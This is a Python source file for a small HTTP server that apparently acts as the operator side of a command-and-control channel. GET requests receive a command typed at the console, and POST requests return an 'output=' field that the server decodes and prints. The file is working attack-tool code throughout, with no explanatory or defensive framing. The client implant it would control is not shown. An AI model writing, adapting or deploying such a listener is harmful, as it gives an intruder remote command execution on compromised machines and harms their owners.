from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import unquote

HOST_NAME = '127.0.0.1'
PORT_NUMBER = 80

class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        user_input = input("Enter a command to send to the client: ")
        self.wfile.write(user_input.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        output_start = post_data.find(b'output=') + len(b'output=')
        output = post_data[output_start:]
        decoded_output = unquote(output.decode('utf-8'))
        response_data = f"Output:\n{decoded_output}"

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(response_data.encode('utf-8'))  # Encode as bytes before writing
        print(response_data)  # Print the response to the console

if __name__ == '__main__':
    server_class = HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)

    try:
        print(f"[*] Server started on http://{HOST_NAME}:{PORT_NUMBER}/")
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()
